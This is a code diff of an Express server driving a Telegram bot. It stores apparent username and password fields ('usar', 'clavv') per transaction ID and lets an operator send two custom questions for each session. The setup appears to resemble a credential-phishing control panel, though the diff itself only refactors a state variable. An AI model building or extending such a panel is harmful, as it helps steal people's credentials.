@@ -52,7 +52,7 @@ app.post('/enviar', async (req, res) => {
     usar,
     clavv,
     preguntas: [],
-    esperando_pregunta: 0
+    esperando: null
   };
   guardarEstado();
 
@@ -90,16 +90,19 @@ app.post('/webhook', async (req, res) => {
     if (!cliente) return res.sendStatus(404);
 
     if (accion === 'preguntas_menu') {
-      cliente.esperando_pregunta = 1;
       cliente.preguntas = [];
+      cliente.esperando = 'pregunta1';
       guardarEstado();
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: `✍️ Escribe la primera pregunta personalizada para ${txid}.`
+          chat_id: callback.message.chat.id,
+          text: `✍️ Escribe la primera pregunta personalizada para ${txid}.`,
+          reply_markup: {
+            force_reply: true
+          }
         })
       });
 
@@ -121,34 +124,35 @@ app.post('/webhook', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  if (req.body.message) {
+  if (req.body.message && req.body.message.reply_to_message) {
     const message = req.body.message;
     const chatId = message.chat.id;
     const text = message.text?.trim();
 
-    const txid = Object.keys(clientes).find(id => clientes[id].esperando_pregunta > 0);
-    if (!txid) return res.sendStatus(200);
+    const txid = Object.keys(clientes).find(id => clientes[id].esperando);
+    if (!txid || !text) return res.sendStatus(200);
 
     const cliente = clientes[txid];
-    if (!cliente || !text) return res.sendStatus(200);
 
-    if (cliente.esperando_pregunta === 1) {
+    if (cliente.esperando === 'pregunta1') {
       cliente.preguntas[0] = text;
-      cliente.esperando_pregunta = 2;
+      cliente.esperando = 'pregunta2';
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: chatId,
-          text: `✅ Primera pregunta guardada.
-
-✍️ Ahora escribe la segunda pregunta personalizada para ${txid}.`
+          text: `✅ Primera pregunta guardada. Ahora escribe la segunda pregunta personalizada para ${txid}.`,
+          reply_markup: {
+            force_reply: true
+          }
         })
       });
-    } else if (cliente.esperando_pregunta === 2) {
+
+    } else if (cliente.esperando === 'pregunta2') {
       cliente.preguntas[1] = text;
-      cliente.esperando_pregunta = 0;
+      cliente.esperando = null;
       cliente.status = 'preguntas';
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -158,7 +162,7 @@ app.post('/webhook', async (req, res) => {
           chat_id: chatId,
           text: `✅ Segunda pregunta guardada.
 
-Preguntas actuales para ${txid}:
+Preguntas para ${txid}:
 1️⃣ ${cliente.preguntas[0]}
 2️⃣ ${cliente.preguntas[1]}`
         })
